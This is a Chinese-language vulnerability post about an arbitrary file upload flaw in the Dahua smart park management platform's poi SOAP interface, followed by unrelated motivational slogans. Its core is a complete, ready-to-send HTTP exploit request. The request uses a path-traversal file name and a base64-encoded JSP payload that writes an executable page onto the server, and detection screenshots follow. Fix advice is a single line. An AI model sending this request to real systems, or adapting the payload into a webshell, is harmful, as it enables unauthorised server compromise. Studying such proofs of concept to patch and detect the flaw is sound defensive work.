#  大华智慧园区综合管理平台poi任意文件上传漏洞   
原创 SXdysq  南街老友   2024-04-01 23:35  
  
**漏洞描述**  
  
大华智慧园区综合管理平台是一款综合管理平台，具备园区运营、资源调配和智能服务等功能。该平台旨在协助优化园区资源分配，满足多元化的管理需求，同时通过提供智能服务，增强使用体验。该平台emap/webservice/gis/soap/poi接口存在文件上传漏洞，攻击者利用该漏洞可以获取服务器权限。  
  
**漏洞请求包**  
```
POST /emap/webservice/gis/soap/poi HTTP/1.1
Host: 127.0.0.1
Content-Type: text/xml;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:res="http://response.webservice.poi.mapbiz.emap.dahuatech.com/">
<soapenv:Header/>
<soapenv:Body>
<res:uploadPicFile>
<!--type: string-->
<arg0>/../../test.jsp</arg0>
<!--type: base64Binary-->
<arg1>PCUgb3V0LnByaW50bG4oIlFheDM2b25iIik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCkpKS5kZWxldGUoKTsgJT4=</arg1>
</res:uploadPicFile>
</soapenv:Body>
</soapenv:Envelope>
```  
  
**漏洞检测与利用**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBA3OFRchq3n6RsSdnudl8ibQjpQBJBrwOXz8YnicxJ6SiaKPKIN0gbTIWX72N4LLCh1mUGIIk5QDlIw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dfviaLov8RtBA3OFRchq3n6RsSdnudl8ibqjYKeyaCnQhmwvt0xQHU1XsObmKj6nCXawBnnwnqC15AaLYv2DHXbQ/640?wx_fmt=png&from=appmsg "")  
### 修复建议  
  
  
厂商已更新（https://www.dahuatech.com）。  
  
  
**鸡汤**  
  
成功的秘诀在于坚持不懈；  
  
勇敢的人在每一次跌倒后都会站起来，再次出发；  
  
失败只是通往成功的必经之路；  
  
别人能做到的，你也能做到，只要你有勇气和决心；  
  
每一步的努力都是向梦想更近一步；  
  
相信自己，你比自己想象的更强大；  
  
只要心怀希望，没有什么是不可能的；  
  
  
相信自己，你比自己想象的更勇敢，更坚强；  
  
无论遇到什么困难，都要相信自己，坚持下去，你一定能突破困境，看到更美好的明天；  
  
  
当你感到迷茫时，记得你曾经为何出发；  
  
生命中最困难的挑战，往往也是最美好的经历；  
  
不要等待机会，而是创造机会；  
  
成功的秘诀在于坚持不懈；  
  
  
当生活给你一百个理由哭泣，你就要用一千个理由去笑；  
  
不经历风雨，怎能见彩虹；  
  
成功并不是重要的事情，重要的是努力和坚持；  
  
生活不会因为你眼泪而停滞，它还在继续，所以请振作起来；  
  
世界总是让你感到孤独时，别忘了还有自己；  
  
只有脚踏实地，才能走得更远；  
  
每一次跌倒都是为了让你学会如何更加坚强地站起来；  
  
别让别人的眼光左右你的人生，你的选择决定了你的人生。  
  
  
  
  
  
